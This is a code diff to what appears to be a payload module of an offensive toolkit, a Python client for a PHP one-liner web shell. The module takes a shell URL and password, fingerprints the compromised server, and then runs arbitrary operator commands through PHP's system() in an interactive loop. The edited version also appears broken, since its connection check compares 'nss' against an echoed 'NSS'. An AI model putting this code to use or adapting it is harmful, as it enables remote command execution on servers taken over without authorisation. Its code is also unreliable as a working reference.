@@ -1,29 +1,33 @@
 
-# -*- coding: cp936 -*-
-class mstpayload:
+# -*- coding: utf-8 -*-
+class NSSPayload:
     '''php_cmdshell payload'''
     opts = [
         ['shell','PHP一句话地址'],
         ['pass','PHP一句话密码']
         ]
+
     codes = {
-        "test":'echo "mst";',
+        "test":'echo "NSS";',
         "uname":'echo php_uname();',
         "letter":'$l=range("A","Z");foreach($l as $d){if(is_dir($d.":")){echo $d.":\ ";}}',
         "path":'session_start();if($_SESSION["pwd"]==""){$_SESSION["pwd"]=getcwd();}echo $_SESSION["pwd"];',
         }
+
     def __init__(self,arr):
-        self.url=arr[0]
-        self.pwd=arr[1]
+        self.url = arr[0]
+        self.pwd = arr[1]
+
     def start(self):
         def res(code):
             '''get code exec res~'''
-            return payloadfuck.getres(self.url,self.pwd,code)
-        color.cprint("[*] Test if shell exists..",YELLOW)
-        if res(self.codes['test']) == "mst":
-            color.cprint("[+] Connect OK !",GREEN)
-            color.cprint("[*] Uname : %s"%res(self.codes['uname']),CYAN)
-            color.cprint("[*] Letter: %s"%res(self.codes['letter']),CYAN)
+            return payload.getRes(self.url ,self.pwd ,code)
+
+        pp.prettyPrint("[*] Test if shell exists.." ,YELLOW)
+        if res(self.codes['test']) == "nss":
+            pp.prettyPrint("[+] Connect OK !" ,GREEN)
+            pp.prettyPrint("[*] Uname : %s"%res(self.codes['uname']) ,CYAN)
+            pp.prettyPrint("[*] Letter: %s"%res(self.codes['letter']) ,CYAN)
             path = self.codes['path']
             while 1:
                 spath = res(path)
@@ -52,5 +56,5 @@ class mstpayload:
                     elif cmd[1:2] == ":" and len(cmd) == 2:
                         path = 'session_start();chdir("%s");if($_SESSION["pwd"]==""){$_SESSION["pwd"]=getcwd();}echo $_SESSION["pwd"];'%(cmd)
                     else:
-                        code = 'chdir("%s");echo system("%s");'%(spath,cmd)
-                        color.cprint(res(code),GREY)
+                        code = 'chdir("%s");echo system("%s");'%(spath ,cmd)
+                        pp.prettyPrint(res(code) ,GREY)
